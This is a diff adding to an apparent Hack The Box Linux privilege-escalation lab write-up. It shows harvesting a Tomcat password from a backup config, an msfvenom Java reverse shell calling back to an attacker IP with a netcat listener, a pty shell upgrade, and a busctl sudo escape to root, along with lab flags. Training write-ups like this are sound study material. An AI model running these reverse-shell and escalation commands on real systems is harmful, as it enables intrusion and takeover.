@@ -267,6 +267,51 @@ LLPE{ch3ck_th0se_cmd_l1nes!}
 barry@nix03:/home/htb-student$ cat /var/log/flag3.txt 
 LLPE{h3y_l00k_a_fl@g!}
 ```
+##### service running on local port:
+```
+barry@nix03:~$ find / -iname *tomcat* 2>/dev/null | grep -i user
+/etc/tomcat9/tomcat-users.xml
+/etc/tomcat9/tomcat-users.xml.bak
+
+barry@nix03:~$ cat /etc/tomcat9/tomcat-users.xml.bak
+<SNIP>
+<user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" 
+<SNIP>
+
+msfvenom -p java/shell_reverse_tcp lhost=10.10.14.191 lport=4040 -f war -o pwn.war
+nc -lvnp 4040
+listening on [any] 4040 ...
+connect to [10.10.14.191] from (UNKNOWN) [10.129.110.65] 58634
+
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+python -c 'import pty; pty.spawn("/bin/bash")'
+OR
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export TERM=xterm-256color
+alias ll='ls -lsaht --color=auto'
+Ctrl + Z [Background Process]
+stty raw -echo ; fg ; reset
+stty columns 200 rows 200
+tomcat@nix03:/var/lib/tomcat9$ cat /var/lib/tomcat9/flag4.txt 
+LLPE{im_th3_m@nag3r_n0w}
+```
+##### sudo -l:
+```
+tomcat@nix03:/var/lib/tomcat9$ sudo -l
+Matching Defaults entries for tomcat on nix03:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tomcat may run the following commands on nix03:
+    (root) NOPASSWD: /usr/bin/busctl
+
+GTFO BINs:
+tomcat@nix03:/var/lib/tomcat9$ sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
+# cat /root/flag5.txt
+LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
+```
+
 
 
 
